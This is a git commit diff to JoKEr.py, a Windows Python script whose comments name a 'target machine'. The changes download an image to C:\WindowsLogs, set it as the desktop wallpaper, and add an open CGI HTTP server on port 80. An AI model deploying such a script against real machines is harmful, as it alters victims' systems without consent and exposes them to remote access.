7c8ecaad8630ad3b89f2c5f0b14fc27c9d33ef53
Kamil Grudzien <kamilgrudzien4@gmail.com>
2021-10-09 12:01:41 -0500

    Updated JoKEr.py
    added Elvis's run_server function
    added dynamic functionality to background download
    removed static global variables

--- JoKEr.py
+++ JoKEr.py
@@ -1,24 +1,23 @@
-import os
-import sys
-import ctypes
-import time
-import shutil
-import socket
+import os # grabbing the system operating system
+import sys # identifying the system-specific parameters and functions
+import ctypes #ctypes for wallpaper changes
+import time #time can be used for delays and cycle changes
+import shutil #copying files
+import socket #Starting up a webserver
+import urllib.request #Downloading files from web
 import subprocess
-#using ctypes for wallpaper changes
-#time we can use for delays and cycling changes
+
 
 #GLOBAL VARIABLES
 dir_path = "C:\WindowsLogs"
-img = r"C:\Users\Kamil\Desktop\image.jpg"
-img1 = r"C:\Users\Kamil\Desktop\v33r1.png"
 
 
 #background is to set background of target machine
-#need to update this to not include the absolute path
 def background():
+    url = "https://raw.githubusercontent.com/kamilgrudzien/JoKEr/main/v33r1.png"
+    urllib.request.urlretrieve(url, "C:/WindowsLogs/veer.png")
     #SPI_SETDESKWALLPAPER = 20
-    ctypes.windll.user32.SystemParametersInfoW(20, 0, img, 0)
+    ctypes.windll.user32.SystemParametersInfoW(20, 0, "C:/WindowsLogs/veer.png", 0)
 
 def ip_address():
     hostname = socket.gethostname()
@@ -28,8 +27,8 @@ def ip_address():
     print("Your attacking Computer IP Address is:" + IPAddr, file=f)
     f.close()    
 
-def copy_files(sourceFolder, targetFolder):
-    shutil.copytree(sourceFolder, targetFolder)
+def copy_file(source,target):
+    shutil.copytree(source, target)
     print("files copied")
     
 def dir_create():
@@ -38,12 +37,18 @@ def dir_create():
         os.mkdir(dir_path,mode = 0o777)
     else:
         print('The directory is present.')
+        
+def run_server():
+    from http.server import HTTPServer, CGIHTTPRequestHandler
+    os.chdir('.')
+    server_object = HTTPServer(server_address=('0.0.0.0', 80), RequestHandlerClass=CGIHTTPRequestHandler)
+    server_object.serve_forever()
 
 def main():
-    background()
-    print("Wallpaper successfully applied")
     dir_create()
     print("Directory successfully created")
+    background()
+    print("Wallpaper successfully applied")
 
 if __name__ == "__main__":
     main ()
